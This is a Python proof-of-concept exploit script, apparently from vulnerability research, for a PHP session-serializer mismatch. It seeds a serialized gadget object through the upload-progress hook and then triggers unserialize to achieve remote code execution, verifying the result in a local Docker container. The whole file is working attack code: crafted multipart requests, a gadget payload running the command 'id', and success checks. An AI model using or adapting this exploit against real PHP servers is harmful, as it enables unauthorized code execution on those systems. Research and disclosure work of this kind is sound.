#!/usr/bin/env python3
"""Serializer-mismatch x opcache.preload object-injection -> RCE (app-free both sides).

SEED: the rfc1867 upload-progress hook stores ``A|<serialized gadget>`` as a
session key; on a php_serialize write-context it persists verbatim. READ: a
second upload-progress POST to a php read-context (the mismatch) re-splits the
key pre-RINIT and unserialize()s the trailing ``O:..`` -> __destruct fires, with
no app endpoint reading the session. A clean __destruct keeps the worker alive.

Handler-mismatch logic bug (not a memory-corruption bug). Needs (non-default): a
php_serialize/php serialize_handler asymmetry across contexts sharing save_path+
SID (real .user.ini; not ini_set-synthesisable); an opcache.preload gadget class;
upload_progress on, known save_path, controllable SID. Removes the app gadget/
reader dependency but not the config dependency.
"""
from __future__ import annotations
import argparse, http.client, os, secrets, subprocess, sys, urllib.parse

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.multipart import part as _mp_part, terminator as _mp_terminator  # noqa: E402

GADGET = 'O:10:"MxplGadget":2:{s:3:"cmd";s:2:"id";s:4:"path";s:19:"/tmp/mxpl_pwned.txt";}'

def multipart(fields, filefield, filename, filedata):
    b = "----mxpl" + secrets.token_hex(8)
    out = bytearray()
    for name, val in fields:
        out += _mp_part(name, val, boundary=b)
    out += _mp_part(filefield, filedata, filename=filename,
                    ctype="application/octet-stream", boundary=b)
    out += _mp_terminator(b)
    return b, bytes(out)

def post_multipart(host, port, path, sid, progress_value, filedata):
    b, body = multipart(
        [("PHP_SESSION_UPLOAD_PROGRESS", progress_value)],
        "f", "x.bin", filedata)
    c = http.client.HTTPConnection(host, port, timeout=30)
    c.request("POST", path, body=body, headers={
        "Content-Type": f"multipart/form-data; boundary={b}",
        "Cookie": f"PHPSESSID={sid}",
        "Content-Length": str(len(body)),
    })
    r = c.getresponse(); data = r.read(); c.close()
    return r.status, data

def sess_file(container, sid):
    return subprocess.run(
        ["docker", "exec", container, "sh", "-c", f"cat /tmp/sess_{sid} 2>/dev/null"],
        capture_output=True).stdout

def read_marker(container):
    return subprocess.run(
        ["docker", "exec", container, "sh", "-c", "cat /tmp/mxpl_pwned.txt 2>/dev/null; rm -f /tmp/mxpl_pwned.txt"],
        capture_output=True).stdout.decode(errors="replace").strip()

def run(host, port, container, write_path, read_path, label):
    sid = "mxpl" + secrets.token_hex(8)
    blob = b"B" * (64*1024)
    # cleanup any stale marker
    subprocess.run(["docker","exec",container,"sh","-c","rm -f /tmp/mxpl_pwned.txt"],capture_output=True)
    # 1) SEED under php_serialize (write dir)
    poison = "A|" + GADGET
    s1, _ = post_multipart(host, port, write_path, sid, poison, blob)
    disk = sess_file(container, sid)
    seeded = b"MxplGadget" in disk and disk[:5] in (b"a:1:{", b"a:2:{", b"a:3:{")
    # 2) TRIGGER under php (read dir) -> pre-RINIT decode -> injection
    s2, _ = post_multipart(host, port, read_path, sid, "track", blob)
    marker = read_marker(container)
    fired = marker.startswith("MXPL-RCE")
    print(f"[{label}] seed_status={s1} trigger_status={s2}")
    print(f"[{label}] on-disk php_serialize poison present: {seeded}  (head={disk[:40]!r})")
    print(f"[{label}] gadget fired: {fired}  marker={marker!r}")
    return fired

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8914)
    ap.add_argument("--container", default="php2shell-mxpl-php")
    ap.add_argument("--write-path", default="/write/seed.php")
    ap.add_argument("--read-path", default="/read.php")
    ap.add_argument("--label", default="vuln-8.4.26")
    a = ap.parse_args()
    ok = run(a.host, a.port, a.container, a.write_path, a.read_path, a.label)
    sys.exit(0 if ok else 1)
